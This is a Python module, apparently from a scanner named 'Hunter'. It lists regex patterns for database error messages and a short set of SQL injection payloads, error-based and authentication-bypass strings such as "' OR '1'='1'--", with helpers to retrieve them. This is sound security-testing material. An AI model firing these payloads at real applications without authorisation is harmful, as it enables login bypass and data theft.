"""SQL Injection payloads for Hunter"""

from typing import Dict, List


# SQL error patterns by database type
SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
    'mysql': [
        r'SQL syntax.*MySQL',
        r'Warning.*mysql_',
        r'You have an error in your SQL syntax',
        r'mysqli_',
        r'mysql_fetch_',
        r'MySQL.*error',
        r'ERROR.*mysql',
    ],
    'postgresql': [
        r'PostgreSQL.*ERROR',
        r'Warning.*pg_',
        r'Pg_query',
        r'Pg_exec',
        r'ERROR.*postgresql',
    ],
    'mssql': [
        r'Driver.*SQL.*Server',
        r'ODBC SQL Server Driver',
        r'Microsoft SQL Server',
        r'OLE DB.*SQL Server',
        r'SQLServer',
    ],
    'oracle': [
        r'ORA-[0-9]{5}',
        r'Oracle error',
        r'Oracle.*Driver',
        r'ERROR.*oracle',
    ],
    'sqlite': [
        r'SQLite.*error',
        r'SQLite.*syntax',
        r'unrecognized token:',
        r'SQLite.*Exception',
    ],
    'generic': [
        r'SQL syntax.*error',
        r'syntax error.*SQL',
        r'Unexpected.*SQL',
        r'Unclosed quotation mark',
        r'quoted string not properly terminated',
        r'Error.*SQL',
        r'SQL.*Exception',
        r'Database.*error',
        r'Incorrect syntax',
        r'Syntax error',
        r'Invalid.*query',
    ]
}


# SQL Injection payloads organized by category
# OPTIMIZED: Only most effective payloads for fast detection
SQLI_PAYLOADS: Dict[str, List[str]] = {
    "error_based": [
        "'",                    # Single quote - most common
        "'))--",               # Closing parens + comment
        '")--',                # Double quote variant
    ],
    "auth_bypass": [
        "' OR '1'='1'--",      # Classic bypass
        "admin'--",            # Admin login bypass
        "') OR '1'='1--",      # Closing paren variant
    ]
}


def get_payloads(category: str) -> List[str]:
    """Get payloads for a specific category"""
    return SQLI_PAYLOADS.get(category, [])


def get_all_payloads() -> List[str]:
    """Get all payloads flattened"""
    all_payloads = []
    for category_payloads in SQLI_PAYLOADS.values():
        all_payloads.extend(category_payloads)
    return list(dict.fromkeys(all_payloads))  # Remove duplicates


def is_auth_bypass_payload(payload: str) -> bool:
    """Check if payload is for authentication bypass"""
    bypass_keywords = ['admin', 'or', 'and', '--', '#', '/*']
    payload_lower = payload.lower()
    return any(kw in payload_lower for kw in bypass_keywords)
